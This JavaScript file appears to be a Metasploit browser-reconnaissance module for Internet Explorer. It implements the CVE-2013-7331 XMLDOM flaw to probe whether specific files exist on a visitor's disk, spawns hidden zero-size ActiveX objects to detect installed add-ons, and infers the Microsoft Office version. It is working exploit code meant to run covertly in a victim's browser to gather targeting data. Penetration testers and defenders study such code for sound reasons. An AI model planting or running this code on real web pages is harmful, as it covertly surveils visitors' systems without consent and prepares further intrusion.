var ie_addons_detect = { };

var XMLDOMRESULTS = {
  UNKNOWN : {value: 0, message: "Unknown!", color: "black", data: ""}, 
  BADBROWSER: {value: 1, message: "Browser is not supported. You need IE!", color: "black", data: ""}, 
  FILEFOUND : {value: 2, message: "File was found!", color: "green", data: ""},
  FOLDERFOUND : {value: 3, message: "Folder was found!", color: "green", data: ""},
  NOTFOUND : {value: 4, message: "Object was not found!", color: "red", data: ""},
  ALIVE : {value: 5, message: "Alive address!", color: "green", data: ""},
  MAYBEALIVE : {value: 6, message: "Maybe an alive address!", color: "blue", data: ""},
  DEAD : {value: 7, message: "Dead to me! Undetectable?", color: "red", data: ""},
  VALIDDRIVE : {value: 8, message: "Available Drive!", color: "green", data: ""},
  INVALIDDRIVE : {value: 9, message: "Unavailable Drive!", color: "red", data: ""}
};

ie_addons_detect.validateXML = function (txt) {
  // This is CVE-2013-7331. See auxiliary/gather/ie_files_disclosure
  var result = XMLDOMRESULTS.UNKNOWN;
  if (window.ActiveXObject) {
    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = true;
    try {
      xmlDoc.loadXML(txt);
      if (xmlDoc.parseError.errorCode != 0) {
        var err;
        err = "Error Code: " + xmlDoc.parseError.errorCode + "\n";
        err += "Error Reason: " + xmlDoc.parseError.reason;
        err += "Error Line: " + xmlDoc.parseError.line;
        var errReason = xmlDoc.parseError.reason.toLowerCase();
        if (errReason.search('access is denied') >= 0)  {
          result = XMLDOMRESULTS.ALIVE;
        } else if(errReason.search('the system cannot locate the object') >= 0 || errReason.search('the system cannot find the file') >= 0 || errReason.search('the network path was not found') >= 0) {
          result = XMLDOMRESULTS.NOTFOUND;
        } else if(errReason!=''){
          result = XMLDOMRESULTS.FILEFOUND;
        } else{
          result = XMLDOMRESULTS.UNKNOWN; // No Error? Unknown!
        };
        } else {
          result = XMLDOMRESULTS.FILEFOUND;
      }
    } catch (e) {
        result = XMLDOMRESULTS.FOLDERFOUND;
    }
  } else {
      result = XMLDOMRESULTS.BADBROWSER;
  }
    result.data = "";
    return result;
};


ie_addons_detect.checkFiles = function (files) {
  var foundFiles = new Array();
  // the first one is for all drives, the others are for the C drive only!
  var preMagics = ["res://","\\\\localhost\\\\", "file:\\\\localhost\\", "file:\\"];
  // or any other irrelevant ADS! - we do not need this when we use Res://
  var postMagics = ["::$index_allocation"];

  var templateString = '<?xml version="1.0" ?><\!DOCTYPE anything SYSTEM "$target$">';

  for (var i = 0; i < files.length; i++) {
    var filename = files[i];
    if (filename != '') {
      filename = preMagics[0] + filename; // postMagics can be used too!
      var result = ie_addons_detect.validateXML(templateString.replace("$target$", filename));
      if (result == XMLDOMRESULTS.FOLDERFOUND || result == XMLDOMRESULTS.ALIVE) result = XMLDOMRESULTS.UNKNOWN;
      result.data = filename;
      if (result.message.search(/file was found/i) > -1) {
        var trimmedFilename = result.data;
        // Clean up filenames
        for (var prem in preMagics)   { trimmedFilename = trimmedFilename.replace(preMagics[prem], ''); }
        for (var postm in postMagics) { trimmedFilename = trimmedFilename.replace(postMagics[postm], ''); }
        foundFiles.push(trimmedFilename);
      }
    }
  }
  return foundFiles;
};

/**
 * Returns true if this ActiveX is available, otherwise false.
 * Grabbed this directly from browser_autopwn.rb
 **/
ie_addons_detect.hasActiveX = function (axo_name, method) {
  var axobj = null;
  if (axo_name.substring(0,1) == String.fromCharCode(123)) {
    axobj = document.createElement("object");
    axobj.setAttribute("classid", "clsid:" + axo_name);
    axobj.setAttribute("id", axo_name);
    axobj.setAttribute("style", "visibility: hidden");
    axobj.setAttribute("width", "0px");
    axobj.setAttribute("height", "0px");
    document.body.appendChild(axobj);
    if (typeof(axobj[method]) == 'undefined') {
      var attributes = 'id="' + axo_name + '"';
      attributes += ' classid="clsid:' + axo_name + '"';
      attributes += ' style="visibility: hidden"';
      attributes += ' width="0px" height="0px"';
      document.body.innerHTML += "<object " + attributes + "></object>";
      axobj = document.getElementById(axo_name);
    }
  } else {
    try {
      axobj = new ActiveXObject(axo_name);
    } catch(e) {
      // If we can't build it with an object tag and we can't build it
      // with ActiveXObject, it can't be built.
      return false;
    };
  }
  if (typeof(axobj[method]) != 'undefined') {
    return true;
  }

  return false;
};

/**
 * Returns the version of Microsoft Office. If not found, returns null.
 **/
ie_addons_detect.getMsOfficeVersion = function () {
  var version;
  var types = new Array();
  for (var i=1; i <= 5; i++) {
    try {
      types[i-1] = typeof(new ActiveXObject("SharePoint.OpenDocuments." + i.toString()));
    }
    catch (e) {
      types[i-1] = null;
    }
  }

  if (types[0] == 'object' && types[1] == 'object' && types[2] == 'object' &&
      types[3] == 'object' && types[4] == 'object')
  {
    version = "2012";
  }
  else if (types[0] == 'object' && types[1] == 'object' && types[2] == 'object' &&
           types[3] == 'object' && types[4] == null)
  {
    version = "2010";
  }
  else if (types[0] == 'object' && types[1] == 'object' && types[2] == 'object' &&
           types[3] == null && types[4] == null)
  {
    version = "2007";
  }
  else if (types[0] == 'object' && types[1] == 'object' && types[2] == null &&
           types[3] == null && types[4] == null)
  {
    version = "2003";
  }
  else if (types[0] == 'object' && types[1] == null && types[2] == null &&
           types[3] == null && types[4] == null)
  {
    // If run for the first time, you must manullay allow the "Microsoft Office XP"
    // add-on to run. However, this prompt won't show because the ActiveXObject statement
    // is wrapped in an exception handler.
    version = "xp";
  }
  else {
    version = null;
  }

  return version;
}